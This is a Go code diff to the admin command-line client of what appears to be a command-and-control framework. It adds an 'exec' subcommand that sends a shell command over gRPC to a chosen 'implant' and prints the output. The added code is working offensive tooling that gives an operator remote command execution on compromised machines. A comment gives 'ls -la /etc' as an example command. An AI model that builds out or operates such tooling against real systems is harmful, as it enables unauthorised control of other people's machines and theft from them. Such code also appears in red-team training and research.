@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"log"
 	"os"
+	"strings"
 	"text/tabwriter"
 
 	"github.com/urfave/cli/v3"
@@ -31,7 +32,6 @@ func main() {
 	}
 	defer conn.Close()
 	client = grpcapi.NewAdminClient(conn)
-	var cmd = new(grpcapi.Command)
 	ctx := context.Background()
 
 	cmdFlags := &cli.Command{
@@ -88,18 +88,43 @@ func main() {
 					return nil
 				},
 			},
-		},
+			{
+				Name:      "exec",
+				Usage:     "Execute a shell command on a specific implant",
+				ArgsUsage: "<implant-id> <command>",
+				Action: func(ctx context.Context, c *cli.Command) error {
+					// 1. Check for minimum arguments: [ID] [Command...]
+					if c.Args().Len() < 2 {
+						return fmt.Errorf("error: you must provide both an implant ID and a command")
+					}
 
-		// Run command
-		Action: func(ctx context.Context, c *cli.Command) error {
-			cmd.In = os.Args[1]
-			cmd, err = client.RunCommand(ctx, cmd)
-			if err != nil {
-				return err
-			}
-			fmt.Println(cmd.Out)
+					// 2. The first argument is the ID
+					targetID := c.Args().First()
 
-			return nil
+					// 3. Join all remaining arguments into a single string.
+					// This handles commands with spaces like: exec <ID> ls -la /etc
+					instruction := strings.Join(c.Args().Slice()[1:], " ")
+
+					// 4. Construct the request
+					req := &grpcapi.Command{
+						ImplantId: targetID,
+						In:        instruction,
+					}
+
+					fmt.Printf("[*] Tasking %s to run: %s\n", targetID, instruction)
+
+					// 5. Call the gRPC server
+					res, err := client.RunCommand(ctx, req)
+					if err != nil {
+						return fmt.Errorf("command failed: %v", err)
+					}
+
+					// 6. Print the results
+					fmt.Printf("[+] Results from %s:\n%s\n", targetID, res.Out)
+
+					return nil
+				},
+			},
 		},
 	}
 
